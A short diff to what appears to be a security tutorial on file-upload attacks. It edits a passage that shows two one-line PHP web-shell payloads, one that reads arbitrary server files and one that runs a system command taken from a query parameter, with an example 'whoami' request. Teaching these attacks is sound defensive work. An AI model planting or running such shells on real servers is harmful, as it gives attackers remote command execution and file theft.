@@ -4,10 +4,9 @@ Read arbitrary files from the server's filesystem:
 
 `<?php echo file_get_contents('/path/to/target/file'); ?>`
 
-Pass an arbitrary system command via a query parameter:
+Pass an arbitrary system command via a query parameter (exploit.php?command=whoami):
 
 `<?php echo system($_GET['command']); ?>`
-  `GET /path-to-file/exploit.php?command=whoami HTTP/1.1`
 
 
 
